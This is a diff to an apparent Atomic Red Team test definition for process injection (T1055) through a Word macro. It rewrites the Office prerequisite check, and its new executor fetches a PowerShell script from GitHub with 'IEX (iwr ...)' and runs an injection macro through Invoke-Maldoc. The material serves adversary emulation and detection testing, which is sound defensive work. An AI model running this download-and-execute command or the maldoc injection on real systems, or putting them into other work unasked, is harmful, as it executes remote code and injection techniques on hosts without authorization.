@@ -46,31 +46,21 @@ atomic_tests:
       description: Maldoc application Word
       type: String
       default: Word
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
-    sub_name:
-      description: Name of Sub to execute
-      type: String
-      default: Execute
-    macrocode:
-      description: Path to Macrocode to execute
-      type: Path
-      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
+      Microsoft #{ms_product} must be installed
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      try {
+        New-Object -COMObject "#{ms_product}.Application" | Out-Null
+        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
     get_prereq_command: |
-      $xlApp = New-Object -ComObject "Word.Application"
-      Stop-Process -Name WORD
+      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
   executor:
     command: |
-      Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Public\Invoke-MalDoc.ps1  
-      Invoke-MalDoc #{macrocode} "#{sub_name}" "#{ms_office_version}" "#{ms_product}"
-    cleanup_command: |
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
     name: powershell
